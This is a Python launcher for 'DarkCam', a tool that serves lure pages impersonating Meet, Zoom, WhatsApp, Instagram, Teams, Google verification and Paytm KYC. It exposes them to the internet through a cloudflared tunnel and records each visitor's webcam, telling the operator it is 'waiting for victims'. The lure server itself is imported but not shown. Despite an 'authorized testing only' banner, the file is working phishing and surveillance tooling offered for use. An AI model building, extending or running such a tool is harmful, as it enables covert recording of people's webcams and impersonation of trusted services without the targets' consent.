#!/usr/bin/env python3
"""
DarkCam — Webcam Video Capture Tool for Authorized Red Team Engagements
Usage: python3 darkcam.py [--page meet|zoom|whatsapp|...] [--port 8080] [--duration 45]
"""

import os
import sys
import time
import argparse
import subprocess
import threading
import signal
import re

_G = "\033[38;5;196m"   # neon red
_O = "\033[38;5;208m"   # neon orange
_W = "\033[38;5;255m"   # bright white
_D = "\033[38;5;240m"   # dim grey
_B = "\033[1m"          # bold
_R = "\033[0m"          # reset

# ── Environment detection ──
IS_TERMUX = "com.termux" in os.environ.get("PREFIX", "") or \
            os.path.exists("/data/data/com.termux")
PREFIX     = os.environ.get("PREFIX", "/usr")
BIN_DIR    = os.path.join(PREFIX, "bin")

BANNER = f"""
{_G} ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀{_O}  ▄████▄   ▄▄▄       ███▄ ▄███▓{_R}
{_G} ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒ {_O} ▒██▀ ▀█  ▒████▄    ▓██▒▀█▀ ██▒{_R}
{_G} ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ {_O} ▒▓█    ▄ ▒██  ▀█▄  ▓██    ▓██░{_R}
{_G} ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ {_O} ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██    ▒██ {_R}
{_G} ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄{_O} ▒ ▓███▀ ░ ▓█   ▓██▒▒██▒   ░██▒{_R}
{_G}  ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒{_O} ░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ░  ░{_R}
{_G}  ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░{_O}   ░  ▒     ▒   ▒▒ ░░  ░      ░{_R}
{_G}  ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ {_O} ░          ░   ▒   ░      ░   {_R}
{_G}    ░          ░  ░   ░     ░  ░   {_O} ░ ░             ░  ░       ░   {_R}
{_G}  ░                                {_O} ░                               {_R}

{_D}        ┌──────────────────────────────────────────────────────────────┐{_R}
{_D}        │{_R}  {_O}{_B}🎥 DarkCam{_R}  {_D}•{_R}  {_W}Webcam Video Capture Framework{_R}  {_D}•{_R}  {_G}v1.0.0{_R}   {_D}│{_R}
{_D}        │{_R}  {_W}Developed by{_R} {_O}{_B}Yaman.RedTeam{_R}  {_D}•{_R}  {_G}Authorized Testing Only{_R}      {_D}│{_R}
{_D}        │{_R}  {_D}➜{_R} {_W}github.com/Yaman-RedTeam/darkcam{_R}  {_D}•{_R}  {_W}8 Lure Pages{_R}           {_D}│{_R}
{_D}        └──────────────────────────────────────────────────────────────┘{_R}
"""

def install_deps():
    req_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
    print(f"  {_O}[*]{_R} Checking dependencies...")
    if IS_TERMUX:
        # Termux — no --break-system-packages needed
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "-r", req_path, "-q"],
            capture_output=True
        )
    else:
        # Try with --break-system-packages first (Kali/Debian managed env)
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "-r", req_path, "-q", "--break-system-packages"],
            capture_output=True
        )
        if result.returncode != 0:
            # fallback without flag (older pip / venv)
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", "-r", req_path, "-q"],
                capture_output=True
            )
    if result.returncode != 0:
        print(f"  {_O}[!]{_R} Dep install warning: {result.stderr.decode()[:200]}")

def check_cloudflared():
    result = subprocess.run(["which", "cloudflared"], capture_output=True)
    if result.returncode != 0:
        print(f"{_O}  [!] cloudflared not found. Installing...{_R}")
        arch = subprocess.check_output(["uname", "-m"], text=True).strip()

        if IS_TERMUX:
            # Termux pe pkg se install karo
            try:
                subprocess.run(["pkg", "install", "-y", "cloudflared"], check=True)
                print(f"{_G}  [+] cloudflared installed via pkg.{_R}")
                return
            except Exception:
                pass
            # fallback: ARM binary download
            binary = "cloudflared-linux-arm64"
            dest = os.path.join(BIN_DIR, "cloudflared")
        else:
            binary = "cloudflared-linux-arm64" if ("arm" in arch or "aarch" in arch) else "cloudflared-linux-amd64"
            dest = "/usr/local/bin/cloudflared"

        subprocess.run(
            f"curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/{binary} "
            f"-o {dest} && chmod +x {dest}",
            shell=True, check=True
        )
        print(f"{_G}  [+] cloudflared installed.{_R}")

def start_tunnel(port: int):
    proc = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    url = None

    def read_stderr():
        nonlocal url
        for line in proc.stderr:
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if match:
                url = match.group(0)
                break

    t = threading.Thread(target=read_stderr, daemon=True)
    t.start()
    t.join(timeout=25)
    return url, proc

def start_flask(page: str, port: int):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, script_dir)
    import server as srv
    srv.app.config["LURE_PAGE"] = page

    def run():
        srv.app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

    t = threading.Thread(target=run, daemon=True)
    t.start()
    time.sleep(1.5)

def print_info(url: str, page: str, port: int, duration: int):
    env_label = f"{_O}Termux (Android){_R}" if IS_TERMUX else f"{_W}Linux{_R}"
    print(f"\n{_D}  ┌──────────────────────────────────────────────────────┐{_R}")
    print(f"{_D}  │{_R}  {_O}{_B}🎥 DARKCAM ACTIVE{_R}                                      {_D}│{_R}")
    print(f"{_D}  ├──────────────────────────────────────────────────────┤{_R}")
    print(f"{_D}  │{_R}  {_D}Platform    :{_R}  {env_label}")
    print(f"{_D}  │{_R}  {_D}Lure Page   :{_R}  {_O}{page.upper()}{_R}")
    print(f"{_D}  │{_R}  {_D}Local URL   :{_R}  http://localhost:{port}")
    print(f"{_D}  │{_R}  {_D}Public URL  :{_R}  {_W}{url}{_R}")
    print(f"{_D}  │{_R}  {_D}Output Dir  :{_R}  {os.path.abspath('output/')}")
    print(f"{_D}  │{_R}  {_D}Rec Duration:{_R}  {duration}s per victim")
    print(f"{_D}  └──────────────────────────────────────────────────────┘{_R}")
    print(f"\n  {_O}[!]{_R} Waiting for victims... (Ctrl+C to stop)\n")
    print(f"  {_D}{'─'*54}{_R}")

def main():
    parser = argparse.ArgumentParser(description="DarkCam — Webcam Video Capture Tool")
    parser.add_argument("--page", choices=["meet","zoom","whatsapp","instagram","omegle","teams","telegram","facetime",
                                           "instagram_verify","google_verify","paytm_kyc"],
                        default="meet", help="Lure page template")
    parser.add_argument("--port", type=int, default=8080, help="Local server port")
    parser.add_argument("--duration", type=int, default=45, help="Recording duration in seconds")
    parser.add_argument("--no-tunnel", action="store_true", help="Skip cloudflared, use local only")
    args = parser.parse_args()

    print(BANNER)

    if IS_TERMUX:
        print(f"  {_O}[*]{_R} Termux environment detected.")

    install_deps()

    if not args.no_tunnel:
        check_cloudflared()

    print(f"  {_G}[+]{_R} Starting Flask server on port {args.port}...")
    start_flask(args.page, args.port)
    print(f"  {_G}[+]{_R} Flask server running.")

    tunnel_proc = None
    public_url = f"http://localhost:{args.port}"

    if not args.no_tunnel:
        print(f"  {_O}[*]{_R} Starting cloudflared tunnel...")
        public_url, tunnel_proc = start_tunnel(args.port)
        if not public_url:
            print(f"  {_G}[-]{_R} Could not get tunnel URL. Use --no-tunnel for local only.")
            sys.exit(1)

    print_info(public_url, args.page, args.port, args.duration)

    def cleanup(sig=None, frame=None):
        print(f"\n\n  {_O}[!]{_R} Shutting down DarkCam...")
        if tunnel_proc:
            tunnel_proc.terminate()
        print(f"  {_G}[+]{_R} DarkCam stopped. Captured files saved in: output/")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
